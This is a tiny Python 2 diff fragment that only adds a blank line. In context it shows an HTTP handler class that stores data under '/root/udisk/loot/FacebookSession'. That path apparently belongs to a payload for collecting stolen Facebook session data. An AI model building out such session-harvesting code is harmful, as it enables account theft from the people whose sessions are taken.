@@ -4,6 +4,7 @@ from os.path import join as pjoin
 
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 
+
 class StoreHandler(BaseHTTPRequestHandler):
     store_path = "/root/udisk/loot/FacebookSession"
     get_path = pjoin(curdir, 'p')
